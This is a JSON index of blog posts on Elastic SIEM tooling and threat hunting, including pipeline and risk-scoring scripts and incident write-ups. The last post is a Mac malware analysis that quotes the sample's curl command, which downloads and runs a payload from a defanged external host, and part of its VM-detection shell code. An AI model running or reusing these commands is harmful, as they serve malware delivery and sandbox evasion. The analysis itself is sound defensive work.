[ { "title": "Debugging Elastic Pipelines", "url": "/posts/Debugging_Ingest_Pipelines/", "categories": "elastic", "tags": "elastic, howto", "date": "2022-08-12 10:08:00 +0200", "snippet": "Over the past weeks I have been migrating to Elasticsearch 8.x with Fleet Agents.This brought some more annoying challenges, namely debugging Ingest Pipelines and trying to figure out how this could bedone in a more relaxed way.So here we go.The Ingest PipelinesFirst let’s get into what Ingest Pipelines are, and how they work.What are they?Dumbed down, they are a way to run an ELK Stack without the L (Logstash) part.So basically we have log source, which either gets Pulled or Pushed to Filebeat and from there via an Ingest Pipeline toan Elasticsearch Index.The Ingest Pipelines are part of Elasticsearch nodes (they need the “ingest” role) and will handle extracting data fromthe incoming events.Basically if you know Logstash and Grok, yes Pipelines also have a Grok Processer etc.Of course Ingest Pipelines are much more complicated than that, but for now this is enough to get you started.Here is a very basic design of how this process could look.%%{init: {&quot;theme&quot;: &quot;dark&quot;}}%%;graph LR;LS[Log Source] --&amp;gt; Filebeat;Filebeat --&amp;gt; IP[Ingest Pipeline];subgraph Elasticsearch;IP --&amp;gt; |Process Data| IP;IP --&amp;gt; ES[Elasticsearch Index];end;And here one with Fleet integration, we will mostly talk about the fleet version, but it’s pretty much the same toFilebeat without fleet.%%{init: {&quot;theme&quot;: &quot;dark&quot;}}%%;graph LR;EAS -.-&amp;gt; |Pull Config| ES;EAS[Fleet Server] -..-&amp;gt; |Push Config| EA;EA[Elastic Agent] -..-&amp;gt; |Push Config| Filebeat;LS[Log Source] ---&amp;gt;|Send Data| Filebeat;Filebeat ---&amp;gt; |Send Data| IP[Ingest Pipeline];subgraph Elasticsearch;IP --&amp;gt; |Process Data| IP;IP ---&amp;gt; |Index Data| ES[Elasticsearch Index];end;Where do they come from?So now that we know what an Ingest Pipeline is, where the fuck do they come from?Basically there are 3 ways to get one. From Fleet From Filebeat Manually madeFocus here of course on Fleet, but basically Filebeat can push Ingest Pipeline config to Elasticsearch.The Fleet uses Integrations, which are either automatically or manually updated.These Integrations build the Ingest Pipeline and an Index Template(for Linking the Index to the correct Ingest Pipeline).I personally would not enable automated updating of Ingest Pipelines, but you do you ;)And what if it fails?Now that, is the actual question I had to answer for myself.If an Ingest Pipeline fails, it will run through “failure processors”.Usually these Processors look something like this:[ { &quot;set&quot;: { &quot;field&quot;: &quot;error.message&quot;, &quot;value&quot;: [ &quot;&quot; ] } }]This will set a field called “error.message” to the value of the failed processors dying words.So yes, we will have an error message in the document.However, we have zero idea which Ingest Pipeline failed, and even if we knew that, we still don’t know which processorfailed.So to make it simple, the default error handling of Ingest Pipelines is not actually usable.It will just tell you something fucked up, and now you’re sherlock, go do your thing.Luckily inthe official documentationthere is a bit of information about other on_failure fields. on_failure_message on_failure_processor_type on_failure_processor_tag on_failure_pipelineFrom this list we can already see, the field “on_failure_pipeline” is very interesting, because it will tell us whichpipeline failed, a little side note here, I have seen this field to not yield anything.On top of that the “on_failure_processor_type” is interesting because it will tell us what failed on a processor (theprocessor itself or for example a condition).And the last one “on_failure_processor_tag” is interesting because it will throw out the tags of a processor.However, a processor by default doesn’t have tags, so let’s fix that later.All in all I build my failure processor like this (yes I stole that from the documentation):[ { &quot;append&quot;: { &quot;field&quot;: &quot;error.message&quot;, &quot;value&quot;: [ &quot;Processor with tag in pipeline failed with message: &quot; ] } }]Now this will really help us a lot already, even without tags.Speaking of tags, I am not sure how good of an idea it is to set too many, may have a performance impact.Anyway, we have a processor now, and we can attach this to every Ingest Pipeline by hand……?Or we could do some simple scripting to automatically set the processor.Sample Script:(since on_failure_pipeline sometimes fails, I decided to use the pipeline name instead)from elasticsearch import Elasticsearchdef get_pipelines(es): return es.ingest.get_pipeline()def put_pipelines(es, pipelines, search=&quot;logs_&quot;): for pipeline_name in pipelines: if search in pipeline_name: print(pipeline_name) failure_processor = [ { &quot;append&quot;: { &quot;field&quot;: &quot;error.message&quot;, &quot;value&quot;: [ &#39;Processor &quot;&quot; with tag &quot;&quot; in pipeline &quot;&#39; + pipeline_name + &#39;&quot; failed with message: &quot;&quot;&#39; ], } } ] es.ingest.put_pipeline( id=pipeline_name, processors=pipelines[pipeline_name][&quot;processors&quot;], on_failure=failure_processor, description=pipelines[pipeline_name][&quot;description&quot;], )es = Elasticsearch( &quot;elastic_hosts&quot;, basic_auth=(&quot;username&quot;, &quot;password&quot;), verify_certs=True, ca_certs=&quot;../ca.crt&quot;, request_timeout=300, max_retries=3,)pipelines = get_pipelines(es)put_pipelines(es, pipelines, search=&quot;logs_&quot;)This script will attach our processor to all Ingest Pipelines that have the word “logs_” in the name.Since every pipeline starting with logs_ has the same default failure processors, it’s pretty safe to overwrite them.Now we are set for error messages.We can use the “error.message” field to debug our problems.As soon as I get an error.message I usually identify the pipeline, and then add tags to all processors inside of it.For this I have another little scriptdef put_pipelines_tags(es, pipelines, search=&quot;logs_cisco.asa&quot;): for pipeline_name in pipelines: if search in pipeline_name: processors = pipelines[pipeline_name][&quot;processors&quot;] logger.info(f&quot;Processing {pipeline_name}&quot;) stepper = 1 for processor in processors: # pprint(processor) for processor_type in processor: processor[processor_type][&quot;tag&quot;] = str(stepper) stepper += 1 # pprint(processor) es.ingest.put_pipeline( id=pipeline_name, processors=processors, on_failure=pipelines[pipeline_name][&quot;on_failure&quot;], description=pipelines[pipeline_name][&quot;description&quot;], )put_pipelines_tags(es, pipelines)And like this, I get a very good indicator of what failed and where.Now the only last thing to do is, use our brains to find out what went wrong.Or just set the processor to ignore failures." }, { "title": "Building a Risk Model in Elastic", "url": "/posts/Elastic_Risk_Model/", "categories": "elastic", "tags": "elastic, howto", "date": "2022-07-29 20:39:00 +0200", "snippet": "Lately I have been thinking about how to do a risk scoring model in Elasticsearch.Yes I am aware that there are risk modelsfor users andfor hostsBut these are heavily dependent on machine learning, and since I have no ML license, I thought it may be interesting tobuild something without ML.QRadar does this in a very similar fashion.The ProcessI built the whole thing on top of the existing logic, every alert has a risk score of 0-100.Additionally, I implemented building blocks that I will call “risk blocks” for additional scoring without affecting thenormal alerting engine, no need to generate alerts for simple things like brute force attacks against someone.The risk of these alerts and risk blocks together, grouped by user.name will make up the risk score.This will result in a score of 0 to infinity for every user.The score is multiplied by 2, if the user is an admin, this is to get a better visibility of admins.Not perfect, but it’s a start and has zero MLEvery hour the existing user risk will be deprecated by 25% (subject to change).When the risk hits 10, it will be set to 0Every 10 minutes an alert rule called “User Risk Score High” will check if any user has a score over a threshold of X.This rule of course is excluded from adding risk to a user, wouldn’t be fair otherwise ;)%%{init: {&quot;theme&quot;: &quot;dark&quot;}}%%;graph LR;RB[Risk Block] -..-&amp;gt;|Set Risk| ER[Event Risk 0-100];AR[Alert Rule] -.-&amp;gt;|Set Risk| ER;RC --&amp;gt; |Every 5 minutes get risk| ER;RC --&amp;gt;|Every 5 minutesIncrement by risk| EN[&quot;Entitiy Risk&quot;];EN --&amp;gt;|if Admin multiply by 2| EN;RD --&amp;gt;|Every hour Decrease risk by 25%| EN;subgraph Alerting Engine;alert[User Risk Score High];RB;AR;end;alert ---&amp;gt;|Alert if over threshold| EN;subgraph Script;RC[Risk Builder];RD[Risk Decrementer];end;The script(s)There are two scripts, one which runs every 5 minutes to calculate risk and build a history, and another that runshourly, to deprecate the risk.IndexesFirst thing to do, is build the indexes. Index Fields Usage security.risk_score @timestampuser.nameuser.risk_scoreevent.dataset Tracking active user risk score security.risk_score_history @timestampuser.nameuser.risk_scoreevent.dataset Tracking historical user risk score security.store @timestampalert_uuidevent.dataset Tracking which alerts where already used to calculate risk from elasticsearch import Elasticsearchdef remove_risk(): try: es.indices.delete(index=&quot;security.risk_score&quot;, ignore=[400, 404]) except: print(&quot;Unable to remove old index&quot;) index_mapping = { &quot;properties&quot;: { &quot;@timestamp&quot;: {&quot;type&quot;: &quot;date&quot;}, &quot;user&quot;: { &quot;properties&quot;: { &quot;name&quot;: {&quot;type&quot;: &quot;keyword&quot;}, &quot;risk_score&quot;: {&quot;type&quot;: &quot;long&quot;}, } }, &quot;event&quot;: { &quot;properties&quot;: {&quot;dataset&quot;: {&quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 1024}} }, } } es.indices.create(index=&quot;security.risk_score&quot;, mappings=index_mapping)def remove_risk_history(): try: es.indices.delete(index=&quot;security.risk_score_history&quot;, ignore=[400, 404]) except: print(&quot;Unable to remove old index&quot;) index_mapping = { &quot;properties&quot;: { &quot;@timestamp&quot;: {&quot;type&quot;: &quot;date&quot;}, &quot;user&quot;: { &quot;properties&quot;: { &quot;name&quot;: {&quot;type&quot;: &quot;keyword&quot;}, &quot;risk_score&quot;: {&quot;type&quot;: &quot;long&quot;}, } }, &quot;event&quot;: { &quot;properties&quot;: {&quot;dataset&quot;: {&quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 1024}} }, } } es.indices.create(index=&quot;security.risk_score_history&quot;, mappings=index_mapping)def remove_store(): try: es.indices.delete(index=&quot;security.store&quot;, ignore=[400, 404]) except: print(&quot;Unable to remove old index&quot;) index_mapping = { &quot;properties&quot;: { &quot;@timestamp&quot;: {&quot;type&quot;: &quot;date&quot;}, &quot;alert_uuid&quot;: {&quot;type&quot;: &quot;keyword&quot;}, &quot;event&quot;: { &quot;properties&quot;: {&quot;dataset&quot;: {&quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 1024}} }, } } es.indices.create(index=&quot;security.store&quot;, mappings=index_mapping)es = Elasticsearch(&quot;https://localhost:9200&quot;, basic_auth=(&quot;user&quot;, &quot;password&quot;))remove_risk()remove_store()remove_risk_history()Risk ScoringNow we need a script to build a bit of logic around the existing alerts, and combine them into risk by user.Appended is a bare-bones script on how this could be done.import datetimefrom elasticsearch import Elasticsearchfrom elasticsearch_dsl import Searchdef get_current_risk(client): &quot;&quot;&quot; This Function is built to get the current risk of the users :param client: Elasticsearch DSL Client :return: User risk &quot;&quot;&quot; s = Search(using=client, index=&quot;security.risk_score&quot;) s = s.filter(&quot;exists&quot;, field=&quot;user&quot;) response = s.scan() users = {} for element in response: element = element.to_dict() users[element[&quot;user&quot;][&quot;name&quot;]] = element[&quot;user&quot;][&quot;risk_score&quot;] return usersdef get_stored_uuids(client): &quot;&quot;&quot; This function is built to get all stored UUIDs so we don&#39;t accidentally use an alert twice to increase risk. :param client: Elasticsearch DSL Client :return: Stored UUIDs &quot;&quot;&quot; s = Search(using=client, index=&quot;security.store&quot;) s = s.filter(&quot;exists&quot;, field=&quot;alert_uuid&quot;) response = s.scan() uuids = [] for element in response: element = element.to_dict() uuids.append(element[&quot;alert_uuid&quot;]) return uuidsdef calculate_risk(client, users, uuids): &quot;&quot;&quot; This function calculates the risk of all users by accumulating the seen alert risk score by user. This score is then doubled if the user is in fact an admin :param client: Elasticsearch DSL Client :param users: dict: All existing users and their risk :param uuids: list: All stored uuids of previous alerts :return: &quot;&quot;&quot; s = Search(using=client, index=&quot;.internal.alerts-security.alerts-*&quot;) s = s.filter(&quot;exists&quot;, field=&quot;user.name&quot;) s = s.exclude(&quot;match&quot;, kibana__alert__rule__name=&quot;User Risk Score High&quot;) s = s.filter(&quot;range&quot;, **{&quot;@timestamp&quot;: {&quot;gte&quot;: &quot;now-30d&quot;}}) response = s.scan() # users = {} alerts = [] changed_users = [] for alert in response: alert = alert.to_dict() if &quot;kibana.alert.uuid&quot; in alert: if alert[&quot;kibana.alert.uuid&quot;] not in uuids: alerts.append(alert[&quot;kibana.alert.uuid&quot;]) if &quot;user.name&quot; in alert or &quot;user&quot; in alert: if &quot;user.name&quot; in alert: user = alert[&quot;user.name&quot;] elif &quot;user&quot; in alert: user = alert[&quot;user&quot;][&quot;name&quot;] user = ( user.lower() ) risk = alert[&quot;kibana.alert.risk_score&quot;] if user in users: users[user] += risk else: users[user] = risk if user not in changed_users: changed_users.append(user) # Cleanup List to avoid chaos # Only updated users need to be pushed again remove_users = [] for user in users: if user not in changed_users: remove_users.append(user) for user in remove_users: del users[user] return users, alertsdef push_risk(es, users): &quot;&quot;&quot; This function is used to push the risk of all changed users to elasticsearch :param es: Elasticsearch client (not DSL) :param users: dict: List of all changed users :return: Returns True or False based if data was pushed or not &quot;&quot;&quot; date = datetime.datetime.now(datetime.timezone.utc) es_array = [] date = datetime.datetime.now(datetime.timezone.utc) for user in users: risk_score = users[user] if &quot;admin&quot; in user: risk_score = risk_score * 2 es_array.append({&quot;index&quot;: {&quot;_index&quot;: &quot;security.risk_score&quot;, &quot;_id&quot;: user}}) es_array.append( { &quot;user&quot;: {&quot;name&quot;: user, &quot;risk_score&quot;: risk_score}, &quot;event.dataset&quot;: &quot;user.risk_score&quot;, &quot;@timestamp&quot;: str(date.isoformat()), } ) if len(es_array) &amp;gt; 0: es.bulk(operations=es_array)def push_uuids(es, uuids): &quot;&quot;&quot; This function stores all uuids used in elasticsearch :param es: :param uuids: :return: nothing &quot;&quot;&quot; date = datetime.datetime.now(datetime.timezone.utc) es_array = [] for alert in uuids: es_array.append({&quot;index&quot;: {&quot;_index&quot;: &quot;security.store&quot;, &quot;_id&quot;: alert}}) es_array.append({&quot;alert_uuid&quot;: alert, &quot;event.dataset&quot;: &quot;risk_score.stored&quot;, &quot;@timestamp&quot;: str(date.isoformat())}) if len(es_array) &amp;gt; 0: es.bulk(operations=es_array)def risk_history(client, es): &quot;&quot;&quot; This function duplicates the current risk of a user to a secondary table for history :param client: Elasticsearch DSL Client :param es: Elasticsearch client (not DSL) :return: nothing &quot;&quot;&quot; s = Search(using=client, index=&quot;security.risk_score&quot;) s = s.filter(&quot;exists&quot;, field=&quot;user.name&quot;) response = s.scan() es_array = [] for user in response: date = datetime.datetime.now(datetime.timezone.utc) user = user.to_dict() es_array.append({&quot;index&quot;: {&quot;_index&quot;: &quot;security.risk_score_history&quot;}}) es_array.append( { &quot;user&quot;: { &quot;name&quot;: user[&quot;user&quot;][&quot;name&quot;], &quot;risk_score&quot;: user[&quot;user&quot;][&quot;risk_score&quot;], }, &quot;event.dataset&quot;: &quot;user.risk_score_history&quot;, &quot;@timestamp&quot;: str(date.isoformat()), } ) es.bulk(operations=es_array)def main(): client = Elasticsearch(&quot;https://localhost:9200&quot;, basic_auth=(&quot;user&quot;, &quot;password&quot;)) es = Elasticsearch(&quot;https://localhost:9200&quot;, basic_auth=(&quot;user&quot;, &quot;password&quot;)) users = get_current_risk(client) uuids = get_stored_uuids(client) users, uuids = calculate_risk(client, users, uuids) if len(users) &amp;gt; 0: push_risk(es, users) push_uuids(es, uuids) risk_history(client, es)if __name__ == &#39;__main__&#39;: main()###At last, we need a little script to deprecate the risk over time.In this example I let the risk deprecate by 25% everytime it is run, and I run it once an hourfrom elasticsearch import Elasticsearchfrom elasticsearch_dsl import Searchdef deprecate_risk(client, es): s = Search(using=client, index=&quot;security.risk_score&quot;) s = s.filter(&quot;exists&quot;, field=&quot;user&quot;) response = s.scan() es_array = [] for user in response: user = user.to_dict() username = user[&quot;user&quot;][&quot;name&quot;] timestamp = user[&quot;@timestamp&quot;] risk_score = user[&quot;user&quot;][&quot;risk_score&quot;] * 0.75 if risk_score &amp;lt; 10: risk_score = 0 es_array.append({&quot;index&quot;: {&quot;_index&quot;: &quot;security.risk_score&quot;, &quot;_id&quot;: username}}) es_array.append( { &quot;user&quot;: {&quot;name&quot;: username, &quot;risk_score&quot;: risk_score}, &quot;event.dataset&quot;: &quot;user.risk_score&quot;, &quot;@timestamp&quot;: timestamp, } ) es.bulk(operations=es_array)def main(): client = Elasticsearch(&quot;https://localhost:9200&quot;, basic_auth=(&quot;user&quot;, &quot;password&quot;)) es = Elasticsearch(&quot;https://localhost:9200&quot;, basic_auth=(&quot;user&quot;, &quot;password&quot;)) deprecate_risk(client, es)if __name__ == &#39;__main__&#39;: main()The ResultNow that we have the risk data monitored, we can for example build a simple dashboard with “lense” to visualise it:Or we can build an alert rule which activates once a threshold is broken etc." }, { "title": "Malicious Forms", "url": "/posts/MS_Forms/", "categories": "Hunting, M365", "tags": "m365, hunting, false positive", "date": "2022-06-14 20:39:00 +0200", "snippet": "Today we investigate a very interesting story.A user told us, he noticed his account was sending Microsoft Forms to internal people, andhe believes he did not dothat.The AlertUsually when a user tells us that their account is used to send out phishing, it’s very likely true positive.So we went ahead and checked this asap.But it got worse, the Mail was proven to be sent intra-org from a company IP, red alert in my opinion.Before going crazy, I made my own form and tried to figure out if there is a way from within forms to send mails, nopeHunting Query:let time_span = datetime(2022-06-14T00:00:00);EmailEvents| where Timestamp between (time_span .. (time_span + 1d))| where SenderFromAddress == &quot;userA@company.domain&quot;| where RecipientEmailAddress == &quot;userB@company.domain&quot;Hunting deeperNow we definitely needed to go deeper, because this feels like a major breach.The only explanation would be someone got credentials and MFA from a person, logged into their VPN, and then from therestarted sending malicious MS Forms. Scary!So first I started hunting for the form name through all M365 I hadHunting Query:search in ( * ) &quot;Formname&quot;| order by Timestamp ascThis gave me some very strange results, there are multiple forms going around with same and similar names but multipleform IDs.OK so far so useless, so I added time to the equationlet time_span = datetime(2022-06-14T00:00:00);search in ( CloudAppEvents ) &quot;Formname&quot;| where Timestamp between (time_span .. (time_span + 1d))| order by Timestamp ascThis gave me one form with one ID to focus on.After some time of being clueless I checked the form ID against the URL sent in the email, hard match!Finally, something to focus on.let time_span = datetime(2022-06-14T00:00:00);search in ( * ) &quot;FORMID&quot;| where Timestamp between (time_span .. (time_span + 1d))| order by Timestamp ascSo far so good, the user opened the form somewhere in the morning, and then sent mails in the afternoon.But when I remove the timespan and focus on the last 30 days, I notice something peculiar.Another user, which was the recipient of the “phishing” mail, was the user who built that form with that exact IDso the flow actually looks something like this:%%{init: {&quot;theme&quot;: &quot;dark&quot;}}%%;flowchart TD;userA --&amp;gt; |CreateForm| form1Create[May 21, 2022 11:47:33 AM] --&amp;gt; form1;userB[&quot;userA@company.domain&quot;] --&amp;gt;|mail logs| mailTime[14.06.22 16:25 UTC+2] --&amp;gt;|mail| userA[&quot;userB@company.domain&quot;];CloudAppEvents --&amp;gt; |ViewRuntimeForm| viewTime[Jun 14, 2022 12:30:46 PM];viewTime --&amp;gt; form1[FORMID];form1 --&amp;gt; userA --&amp;gt; |create mail| createTime2[Jun 14, 2022 4:24:58 PM] --&amp;gt; |send mail| mailTime;VerdictLet’s be honest here, it feels like a very strange pattern.Two users would have to be compromised, and not even close to each other in time.Of course possible, but a huge overkill of an attack, I will check this with the owner of the form, but I think all isOKSpecial side note, M365 features are chaos, it’s possible that the user was able to somehow automatically send Formfillout requests without noticing Indicator Thoughts Verdict User notices misuse of account Very sus +40% Mail is sent from company IP High alert +60% Form created by someone else Very unusual attack pattern -50% Verdict: False PositiveNext StepsCheck the form closer for phishing behaviour" }, { "title": "Building Elastic Security", "url": "/posts/Elastic_Security/", "categories": "elastic", "tags": "elastic, howto", "date": "2022-06-09 18:40:00 +0200", "snippet": "Recently I have started to rebuild my home security setup.This included getting my Elastic Security up and running again.And in this blog entry I want to write a bit about it.However, since Elastic is such a vast topic, I will assume your stack is already up and running, no tshooting of thatfrom me ;)ArchitectureIn my personal opinion a modern installation of Elasticstack should look something like this:%%{init: {&quot;theme&quot;: &quot;dark&quot;}}%%;graph TD;Logfile --&amp;gt; Filebeat;Syslog --&amp;gt; Filebeat;Filebeat --&amp;gt; agent[Elastic Agent];Winlog[Windows Logs] --&amp;gt; Winlogbeat --&amp;gt; agent;ND[Network Data] --&amp;gt; Packetbeat --&amp;gt; agent;Metricbeat --&amp;gt; agent;EDR[Endpoint Security] --&amp;gt; agent;agent--&amp;gt; fleet[Fleet Server];fleet --&amp;gt; Logstash;Logstash --&amp;gt; pipeline[Ingest pipelines];pipeline --&amp;gt; Elasticsearch;Kibana --&amp;gt;|Consume| Elasticsearch;enrichmentLS[Enrichments:DNSDB LookupsAggregationsetc.] -.-&amp;gt; Logstash;enrichmentES[Enrichments:CorrelationsGeolookupInferenceNetwork Directionetc.] -.-&amp;gt; pipeline;Of course in a more professional setup it would be intelligent to add load balancing and message queues.Feel free to pepper in some kafka, RabbitMQ, Kemp, F5 etc. but for my home lab that is definitely not needed.Endpoint SecurityThis is more or less the EDR component of the elastic stack and more or less on feature parity to Endgame.It is used to gather additional telemetry but can also block malicious behaviour.BeatsIf possible, always use beats wherever you can.The most common beat of course is filebeat since it is used to process logfiles, cloud logs as well as syslog streams.Often Metricbeat and Packetbeat are added to the mix to enrich data. In my opinion Packetbeat is particularly usefulfor endpoint security.Elastic AgentThe elastic agent is used to configure the endpoints with the correct beats, gather the data from the different beatsand elastic endpoint agent and then ship it either directly to logstash or via a Fleet Server to elasticsearch.Fleet ServerA fleet server can accept data from one or more elastic agents and ship it into Elasticsearch.This is very useful if you don’t want to bother with logstash.LogstashLogstash is used to extract and enrich data it recieves, preferably via an elastic agent.This data is then sent to elasticsearch for indexing.Some enrichments like DNS Lookups or Elastic DB Lookups are only available in Logstash, and cannot so far be replicatedby Ingest pipelines.For me this is the only reason to still use logstash.Ingest pipelinesThe ingest pipelines are used for log extraction directly in elasticsearch.It is much easier to used compared with logstash and has some unique features which are not available in Logstash, forexample inference (Machine Learning).I personally try and use more ingest pipelines and less logstash if possibleElasticsearchThis the Database :)KibanaThe frontend UI for the whole stack, and also the place we will be in the most time.Getting DataNow that we know a bit about what our setup looks like, let’s get into configuring the security parts, and some otheradditional things if necessary.But as stated before, I have no intention of writing elastic stack basics.FleetSettingsFirst we need data and for that, I utilise elastic fleet you can get there via the main menu -&amp;gt; Management -&amp;gt; FleetStep one go to settings, and setup an output (most likely an elasticsearch node, since logstash is in beta)Agent PolicyAfter that setup your first Agent Policy, for simplicity I also deploy a Fleet Server in the same policy.Some interesting integrations (for Windows): Fleet Server Endpoint Security Prebuilt Security Detection Rules System WindowsSome interesting integrations (for Linux): Fleet Server Endpoint Security Prebuilt Security Detection Rules System AuditdMost integrations are very straight forward to deploy (just add them to the correct policy), except “Endpoint Security”,on Linux make sure to add the flag “Include Session Data” {: .prompt-info } This is only possible after adding theintegration to the agent policy and then editing it again.AgentGo to Agents and click “Add agent” in the following prompts select the correct policy, select “Quick Start”(of course, don’t do that in production).Under add fleet server host if you are deploying a fleet server in the policy point to https://127.0.0.1:8220 (default),otherwise point to wherever your fleet server host is.After that you can generate a service token and deploy an agent wherever you want.As soon as the agent is deployed it should pull its configuration and start sending the data you selected.Elastic SecurityDefault RulesFirst let’s enable the default rules by going to Security -&amp;gt; Alerts -&amp;gt; Rules and downloading the default policies." }, { "title": "Building Home Security", "url": "/posts/Building_Security/", "categories": "elastic", "tags": "elastic, howto, thehive, elastalert", "date": "2022-06-09 17:39:00 +0200", "snippet": "Recently I have been revamping my home security setup.In this Blog I will try and reflect on what all used to build it and how I am planning to improve.Architecture%%{init: {&quot;theme&quot;: &quot;dark&quot;}}%%;graph LR;EDR[Elastic Endpoint Security] --&amp;gt; Fleet[Elastic Fleet];Foritgate --&amp;gt; Filebeat;Suricata --&amp;gt; Filebeat;Netflow --&amp;gt; Filebeat;Filebeat --&amp;gt; Fleet;Fleet --&amp;gt; SIEM[Elastic Search];SIEM --&amp;gt; |Pull|Elastalert;TI[Threat Intelligence] --&amp;gt; Logstash;Logstash --&amp;gt; SIEM;Elastalert --&amp;gt; theHive;theHive --&amp;gt; ST2[Stack Storm];cortex --&amp;gt; |Enrichment| theHive;SetupElastic StackFor my whole Elastic Stack I used the awesome Project of deviantonyBasically just follow the documentation over there, it’s very detailed.Detailed setup of the security part itself will follow in another blogtheHiveFor theHive I used the official image fromtheHive’s githubSetup is very easy, the basic steps are logging in with default credendials (resetting them) establishing a new org andat least one user for that org.ElastalertFor the integration between Elasticsearch and theHive I used Elastalert2,this is subject to change however in case I get annoyed enough.My setup of Elastalert2 (not to be confused with the original elastalert) is a very simple docker container with configand rules.Folder Hierarchy:└── root ├── docker-compose.yml ├── elastalert.yaml └── rules └── rule.yamlDocker ComposeThe compose file should be more or less selfexplanatory, the volumes are used to get the config into the right places.And for the image I used the officiall elastalert2 imageversion: &#39;3.8&#39;services: elastalert2: container_name: elastalert restart: unless-stopped volumes: - &#39;./elastalert.yaml:/opt/elastalert/config.yaml&#39; - &#39;./rules:/opt/elastalert/rules&#39; image: jertel/elastalert2Elastalert ConfigThe config I kept very simple for now.Basic parameters which are needed are of course elasticsearch credentials and frequency.rules_folder: /opt/elastalert/rulesrun_every: seconds: 10buffer_time: minutes: 15es_host: elastic.host.namees_port: 443use_ssl: truees_username: XXXXes_password: XXXXwriteback_index: elastalert-statusalert_time_limit: days: 2Rule ExampleThe rules are a bit more tricky, I’ve tried to use aggregation methods to reduce duplicate alerts(as Elastic doesn’t dedub itself).In this example I aggregate based on the user.name and wait for 10min before triggering the alert.I would love to have a bit more power here, what if I see another alert in two days of the same user?That is a question for another day, I might write my own integration for that.Another big painpoint, the Title of the alert sent cannot be a variable, which is just stupid.I did notice that there is an ongoing discussion on thistopic…name: &quot;Elasticsearch User&quot;type: &quot;any&quot;index: &quot;.siem-signals-default&quot;is_enabled: trueaggregation: minutes: 10terms_size: 50query_key: &#39;user.name&#39;aggregation_key: &#39;user.name&#39;aggregation_by_match_time: truetimestamp_field: &quot;@timestamp&quot;timestamp_type: &quot;iso&quot;filter: - term: signal.status: &quot;open&quot; - query: wildcard: user.name: &quot;*&quot;alert: hivealerterhive_connection: hive_host: http://thehive hive_port: 9000 hive_apikey: XXXXXXXXXXXhive_alert_config: type: &#39;external&#39; source: &#39;elastalert&#39; severity: 2 tags: [ signal.rule.name, agent.name, user.name ] tlp: 3 status: &#39;New&#39; follow: True description_args: [ rule.name ] description: &#39;{0}&#39;hive_observable_data_mapping: - ip: source.ip - ip: destination.ip - ip: host.ip - domain: source.domain - domain: destination.domain - domain: host.name - domain: dns.question.name - hash: hash.md5 - hash: hash.sha1 - hash: hash.sha256Stack StormThis I’ve not been able to build to my satisfaction yet.But the basic premisses are simple get this projectand docker-compose up -dMISPAnother missing part which I had no time as of yet to build." }, { "title": "Unusual number of failed sign-in attempts", "url": "/posts/Admin_Login_Failure/", "categories": "Hunting, MDE", "tags": "mde, hunting, true positive", "date": "2022-05-21 20:39:00 +0200", "snippet": "Today we investigate some failed loginsThe AlertTodays alert looks simple enough, failed loggins with the user “Administrator”But very quickly we see some not so good indicator, the login connection is from 87.251.67.65, so we will focus on this for now.The IP seems to be hosted in Russia judging by the whois entry.Going a bit more in detail of what this IP is doing with my clients, I ran a small advanced hunting query.let ip = &quot;87.251.67.65&quot;;search in (DeviceNetworkEvents, DeviceFileEvents, DeviceLogonEvents, DeviceEvents, EmailEvents, IdentityLogonEvents, IdentityQueryEvents, IdentityDirectoryEvents, CloudAppEvents, AADSignInEventsBeta, AADSpnSignInEventsBeta)Timestamp between (ago(1d) .. now())and (// Events initiated by this IPLocalIP == ipor FileOriginIP == ipor RequestSourceIP == ipor SenderIPv4 == ipor SenderIPv6 == ipor IPAddress == ip// Events affecting this IPor RemoteIP == ipor DestinationIPAddress == ip)And this returns us some good information, the failed logins are over an RDP connection.Now why would this even be possible?To check a bit closer I shot off another small hunting query.DeviceNetworkEvents| where DeviceId == @&quot;mydevice&quot;| where RemoteIPType == @&quot;Public&quot;| where ActionType == @&quot;InboundConnectionAccepted&quot;| distinct LocalPortThis resulted in a whole plethora of public IPs that are connecting to this device over multiple portsPorts observed: 3389 135 8080 2179 2701 57621 139Flowchart%%{init: {&quot;theme&quot;: &quot;dark&quot;}}%%;flowchart TD;87.251.67.65 --&amp;gt; 3389;3389 --&amp;gt; mydevice;style mydevice stroke-dasharray: 88.5 44;Verdict Indicator Thoughts Verdict Logins from Public IP Normally a public IP would not be able to just connect to an endpoint +20% Login via RDP Again, why would RDP be available from public? +30% Huge amount of Public Source IPs Looks very much like the client is reachable from public… +50% It seems like the endpoint is reachable from the public internet.This could have happened via UPNP, manual port forwarding, or by assigning a public IP directly to that host.Especially the port 8080 being reachable seems like this might have been a voluntary action by the user.Verdict: True PositiveNext StepsThis endpoint should never be reachable from the public internet, what a mess" }, { "title": "Mac Malware?", "url": "/posts/Mac-Malware/", "categories": "Hunting, MDE", "tags": "mde, hunting, true positive", "date": "2022-05-19 11:39:00 +0200", "snippet": "Today we investigate some strange discovery actions by processes on a macbookThe AlertIn the essence this alert was showing multiple different processes doing very similar actions, for the sake of simplicity we will focus on one.In most cases the process xpcproxy was used to run a sub process which in turn started some bash commands.For this investigation I put xpcproxy out of scope as it did not seem to be part of a malicious execution chain as it is part of the OS (my mac knowledge is basic)This xpcproxy would run an executable for example apadecoded and this in turn would run new processes, for example:/bin/sh /var/folders/zz/zyxvpxvq6csfxvn_n0000000000000/T/451CEB63-C438-40C3-899F-0BE4F425F074apadecoded itself looks already strange enough and is also found on VT, but what is this “451CEB63-C438-40C3-899F-0BE4F425F074”?here again, for simplicity I focus on one of these odd looking processes, there are a bucket load of them.This executable runs a download via curl of some additional code from external and extracts it to “/private/var/tmp/helpexecd/helpexecd”/usr/bin/curl -s -L -o /var/tmp/helpexecd.tgz hxxp://cdn[.]eniqdix[.]icu/static/s3/exec6625/helpexecd[.]tgztar -xzf /var/tmp/helpexecd.tgz -C /var/tmp/helpexecd/After that the archive helpexecd.tgz is extracted to /var/tmp/helpexecd/ and executed.This new process helpexecd then runs the following command (amongst other things)/bin/sh -c &#39;readonly VM_LIST=&quot;VirtualBox\\|Oracle\\|VMware\\|Parallels\\|qemu&quot;;is_hwmodel_vm(){ ! sysctl -n hw.model|grep &quot;Mac&quot;&amp;gt;/dev/null;};is_ram_vm(){(($(($(sysctl -n hw.memsize)/ 1073741824))&amp;lt;4));};is_ped_vm(){ local -r ped=$(ioreg -rd1 -c IOPlatformExpertDevice);echo &quot;${ped}&quot;|grep -e &quot;board-id&quot; -e &quot;product-name&quot; -e &quot;model&quot;|grep -qi &quot;${VM_LIST}&quot;||echo &quot;${ped}&quot;|grep 